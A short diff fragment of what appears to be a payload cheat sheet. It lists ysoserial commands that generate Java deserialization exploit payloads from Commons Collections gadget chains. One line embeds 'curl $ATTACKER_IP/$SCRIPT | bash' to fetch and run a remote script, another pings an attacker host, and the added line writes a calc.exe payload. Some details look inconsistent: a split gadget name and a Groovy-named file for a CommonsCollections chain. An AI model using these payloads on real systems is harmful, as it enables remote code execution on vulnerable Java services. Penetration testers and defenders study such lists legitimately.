@@ -1,3 +1,4 @@
 ysoserial CommonsCollections1 "id" | base64
 ysoserial CommonsCollections6 "curl $ATTACKER_IP/$SCRIPT | bash" | base64
 ysoserial -g Commons Collections1 -a "ping $ATTACKER_IP"
+ysoserial CommonsCollections1 calc.exe > groovypayload.bin
